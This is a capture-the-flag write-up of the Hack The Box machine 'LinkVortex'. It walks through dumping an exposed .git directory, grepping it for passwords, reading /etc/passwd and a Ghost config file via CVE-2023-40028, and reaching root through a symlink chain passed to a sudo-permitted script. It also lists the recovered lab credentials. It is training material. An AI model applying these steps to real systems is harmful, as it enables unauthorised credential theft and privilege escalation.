---
title: LinkVortex
date: 2025-01-04
description: Exploited an exposed `.git` directory on a Ghost CMS instance to recover credentials, abused CVE-2023-40028 for arbitrary file read, captured SSH access as bob, and escalated privileges through a vulnerable symlink handling script.
tags:
  - htb
  - easy
  - Linux
---

# Initial Recon

Open ports:

```text
22 → ssh
80 → http (apache)
```

## Discoverable Surface

- Wappalyzer identified `Ghost 5.58`
- Subdomain discovered: `dev.linkvortex.htb`
- Interesting directories:
  - `.git`
  - `cgi-bin` (`403`)

# User

## Git Dump

> Reference: https://github.com/arthaud/git-dumper/

Pulled the exposed Git repository into a local dump directory.

```bash
grep -rEi "password\s*=\s*[\'\"]?([^\'\";]+)[\'\"]?" .
```

Leveraged `grep` to extract password-related strings from the dumped repository.

Expression breakdown:

`password\s*=\s*[\'\"]?([^\'\";]+)[\'\"]?`

Used to identify values assigned to password fields. Straightforward stuff. Conveniently left behind too.

Suspicious credentials recovered:

```text
./ghost/core/test/regression/api/admin/authentication.test.js:            const password = 'OctopiFociPilfer45';
./ghost/core/test/regression/api/admin/authentication.test.js:            const password = 'thisissupersafe';
```

Since the target was `linkvortex.htb`, assumed the application was configured with a default administrative account.

Credentials used successfully:

```text
admin@linkvortex.htb : OctopiFociPilfer45
```

## Ghost Arbitrary File Read

After gaining admin access, leveraged the following exploit for arbitrary file read through the Ghost Admin API:

`https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028`

### `/etc/passwd`

```text
root:x:0:0:root:/root:/bin/bash
node:x:1000:1000::/home/node:/bin/bash
```

### `/var/lib/ghost/config.production.json`

The configuration file exposed sensitive credentials for the underlying system.

```text
user     ⇒ bob@linkvortex.htb
password ⇒ fibber-talented-worth
```

SSH was exposed, so the recovered credentials were reused directly for access.

# Root

## Privilege Escalation

Checked sudo permissions:

```bash
sudo -l
```

Output:

```text
(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Reviewed `/opt/ghost/clean_symlink.sh`.

The script validated whether the supplied file was a `.png`. If validation failed, the file was moved into `/var/quarantined`.

Abused the symlink handling logic to read restricted files.

Created a symbolic link chain:

```bash
ln -s /root/root.txt flag.txt
ln -s /home/bob/flag.txt flag.png
```

Executed the vulnerable script:

```bash
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/flag.png
```

The script processed the symlink and exposed the contents of `root.txt` through the quarantined output.

Gained `Root`